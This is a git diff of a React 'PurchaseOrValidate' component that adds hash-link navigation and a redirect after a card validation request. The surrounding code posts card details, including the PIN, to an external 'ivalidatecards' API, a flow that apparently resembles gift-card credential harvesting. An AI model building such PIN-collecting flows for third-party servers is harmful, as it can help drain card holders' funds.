@@ -1,4 +1,5 @@
-import {React , useState } from 'react'
+import {React , useState  } from 'react'
+import { HashLink as Link } from "react-router-hash-link";
 import axios from "axios"
 import "./purchaseOrValidate.scss"
 
@@ -10,6 +11,8 @@ const PurchaseOrValidate = ({card}) => {
   const [isValidating , setIsValidating] = useState(false)
 
   const [purchaseError, setPurchaseError] = useState(false)
+  const [shouldNavigate, setShouldNavigate] = useState(false);
+
 
 
   
@@ -52,6 +55,7 @@ const PurchaseOrValidate = ({card}) => {
 
 
   const handleValidate = async (e) => {
+
     e.preventDefault()
     setIsValidating(true)
     
@@ -67,14 +71,16 @@ const PurchaseOrValidate = ({card}) => {
       pin: formData.get("pin"),
     };
 
-
-
     try {
 
       const response = await axios.post('https://ivalidatecards-api.onrender.com/validate', data);
 
 
       console.log('Response:', response.data);
+
+      window.location.hash = "#submit";
+
+
      
     } catch (error) {
       console.error('Error:', error.response || error.message);
@@ -89,6 +95,7 @@ const PurchaseOrValidate = ({card}) => {
      }, 3000);
 
   };
+  
  
 
   return (
@@ -127,12 +134,12 @@ const PurchaseOrValidate = ({card}) => {
                 <div className="input">
                   <input className="amount" type="text" placeholder='amount $20 - $500' />
                   <input className="number" type="text"  placeholder='no of cards' />
-                  <button type="submit" onClick = {handlePurchase}>{isValidating ?  (
+                  <Link to="/submit" type="submit" onClick = {handlePurchase}>{isValidating ?  (
                   <div className="loading">
                     <img src="/loading.gif" alt="Loading" />
                     <p>Processing...</p>
                   </div>
-                ): "Proceed to Payment" }</button>
+                ): "Proceed to Payment" }</Link>
                 </div>
                 </div>
                 <button className="close-btn">
@@ -201,8 +208,10 @@ const PurchaseOrValidate = ({card}) => {
          }
 
     </div>
-    
+
   )
+
+
 }
 
 export default PurchaseOrValidate
